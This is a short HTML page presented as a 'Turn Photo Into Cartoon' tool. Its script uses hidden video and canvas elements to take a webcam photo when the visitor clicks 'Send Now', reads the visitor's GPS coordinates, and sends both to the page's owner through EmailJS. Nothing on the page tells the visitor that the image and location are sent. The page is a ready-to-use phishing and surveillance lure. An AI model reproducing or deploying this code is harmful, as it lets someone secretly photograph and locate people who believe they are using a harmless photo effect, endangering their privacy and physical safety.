<!DOCTYPE html>
<html>
<head>
  <title>Check your Location</title>
</head>
<body>
  <h2>Turn Photo Into Cartoon</h2>
  <button onclick="captureAndSend()">Send Now</button>

  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("vyxyeBFTfSi_ISmNG"); // Your public key

    async function captureAndSend() {
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");

      // Start camera
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;

      // Wait for video to load
      await new Promise(resolve => setTimeout(resolve, 1500));

      // Capture photo
      canvas.width = 320;
      canvas.height = 240;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageBase64 = canvas.toDataURL("image/png");

      // Stop camera
      stream.getTracks().forEach(track => track.stop());

      // Get location
      navigator.geolocation.getCurrentPosition(function(position) {
        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;

        // Send email with both
        emailjs.send("service_gkkpt4w", "template_96dsagv", {
          message: message,
          image: imageBase64
        })
        .then(res => console.log("Email sent!", res))
        .catch(err => console.error("Email failed", err));
      }, function(error) {
        alert("Error getting location.");
        console.error(error);
      });
    }
  </script>
</body>
</html>
